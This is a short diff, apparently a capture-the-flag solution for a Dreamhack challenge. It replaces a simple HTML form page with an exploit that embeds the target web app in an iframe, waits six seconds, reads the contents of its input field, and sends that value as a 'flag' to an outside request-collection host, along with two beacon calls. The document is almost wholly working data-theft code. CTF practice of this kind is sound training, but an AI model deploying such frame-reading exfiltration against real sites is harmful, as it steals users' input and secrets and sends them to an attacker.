@@ -1,23 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Unexploitable</title>
-</head>
-<body>
-  <form id="form">
-    <input type="text" id="input">
-    <input type="submit" value="submit">
-  </form>
-  <script>
-    document.getElementById("form").onsubmit = e => {
-      e.preventDefault();
-      fetch("https://yyqswwm.request.dreamhack.games", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({input: document.getElementById("input").value})
-      });
-    };
-  </script>
-</body>
-</html>
+<iframe src="http://web:8080/index.html" onload="stealFlag()" id="target"></iframe>
+<script>
+  fetch("https://vvuipmj.request.dreamhack.games?flag=A");
+  function stealFlag() {
+    setTimeout(() => {
+      var input = document.getElementById("target").contentWindow.document.querySelector("#input");
+      fetch("https://vvuipmj.request.dreamhack.games?flag=" + input.value);
+    }, 6000); // 6초 후 실행
+  }
+  fetch("https://vvuipmj.request.dreamhack.games?flag=A");
+</script>
